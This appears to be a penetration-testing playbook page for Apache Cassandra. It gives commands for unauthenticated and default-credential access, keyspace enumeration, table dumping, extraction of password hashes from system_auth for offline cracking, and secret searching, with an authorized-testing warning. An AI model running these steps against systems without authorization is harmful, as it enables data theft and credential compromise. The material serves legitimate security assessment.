---
service: cassandra
title: Apache Cassandra
ports: 9042, 9160
aliases: cql, cassandra-native
---

# Cassandra — quick wins

**When you see it:** 9042/tcp open (CQL native) or 9160/tcp (Thrift, deprecated) and
`cqlsh H` connects without a password → unauthenticated, full read across all keyspaces.
Default install ships with `authenticator: AllowAllAuthenticator` — no creds needed.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the target — get
> sign-off before modifying data or schema.

## Triage (read-only)
```sh
nmap -sV --script cassandra-info -p 9042,9160 H    # version, cluster name, data center
cqlsh H                                             # no-auth connect (AllowAllAuthenticator)
cqlsh H -u cassandra -p cassandra                  # default creds (PasswordAuthenticator)
```

## Quick wins

### Cluster and node info
```sh
# inside cqlsh:
SELECT cluster_name, release_version, native_protocol_version,
       data_center, rack, partitioner
FROM system.local;

SELECT peer, data_center, rack, release_version FROM system.peers;
```
*Why:* confirms reachable nodes, versions, and topology — useful for targeting other nodes
in a multi-DC cluster.

### Enumerate keyspaces and tables
```sh
SELECT keyspace_name FROM system_schema.keyspaces;
DESCRIBE KEYSPACE <KEYSPACE>;
SELECT table_name FROM system_schema.tables WHERE keyspace_name='<KEYSPACE>';
```
*Why:* reveals the full schema without touching data; identify high-value tables (`users`,
`sessions`, `credentials`, `config`).

### Dump a table
```sh
SELECT * FROM <KEYSPACE>.<TABLE> LIMIT 100;
# or export to CSV:
COPY <KEYSPACE>.<TABLE> TO '/tmp/dump.csv' WITH HEADER=TRUE;
```
*Why:* `SELECT *` returns all columns including any stored credentials, tokens, or PII.
`COPY TO` (inside cqlsh) writes a CSV to the local attacker machine when run client-side.

### Extract credential hashes from system_auth
```sh
SELECT role, salted_hash FROM system_auth.roles;   # Cassandra 3+
SELECT username, password FROM system_auth.credentials;   # Cassandra 2.x
```
*Why:* `system_auth.roles` stores bcrypt-hashed passwords for all database users including
`cassandra`; hashes are crackable offline with hashcat mode `3200`.

### Search for secrets across application keyspaces
```sh
# list tables across all keyspaces, then sample likely candidates:
SELECT keyspace_name, table_name FROM system_schema.tables;
USE <KEYSPACE>;
SELECT * FROM <TABLE> WHERE <COLUMN>='admin' ALLOW FILTERING LIMIT 10;
```
*Why:* `ALLOW FILTERING` bypasses the requirement for a partition key in the WHERE clause
— slow on large tables but fine for targeted searches on a pentest.

## aranum helpers
- `enum-cassandra.sh` — the dispatcher that produced the finding (version, auth mode,
  keyspace list).

## Gotchas
- `PasswordAuthenticator` + default `cassandra:cassandra` is the other common state —
  try it immediately; many cloud AMIs ship with it enabled but creds unchanged.
- Cassandra 4+ defaults `authenticator: PasswordAuthenticator` in many distributions;
  `AllowAllAuthenticator` (no-auth) is now opt-in. Check the version before assuming
  no-auth.
- `ALLOW FILTERING` on a large production table causes a full-table scan; coordinate with
  the engagement owner to avoid service disruption.
- Port 9160 (Thrift) is deprecated and disabled by default in Cassandra 4+; target 9042.
- JMX (7199) may be unauthenticated on older nodes — lateral path to MBean-based code
  execution, out of scope for this page.
- `cqlsh` from `pip install cqlsh` works standalone; the bundled version inside
  `/usr/share/cassandra/bin/` requires a local Cassandra install.

## Sources
- HackTricks `9042/9160 Pentesting Cassandra` (blog.1nf1n1ty.team mirror); yezz123
  Pentesting-Exploitation gist (GitHub); Cassandra CQL reference docs.
